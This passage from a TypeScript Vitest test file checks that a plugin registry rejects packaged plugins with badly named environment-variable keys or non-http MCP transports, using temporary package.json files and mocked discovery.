    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-mcp-bad-env": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await expectRegistryLoadFailure(
      ["@acme/junior-plugin-mcp-bad-env"],
      'Plugin demo env-vars key "lowercase-name" must match [A-Z_][A-Z0-9_]*',
    );
  });

  it("rejects non-http MCP transports", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithInvalidMcpTransport(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-mcp-invalid-transport": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await expectRegistryLoadFailure(
      ["@acme/junior-plugin-mcp-invalid-transport"],
      'Plugin demo mcp.transport must be "http"',
    );
  });
});
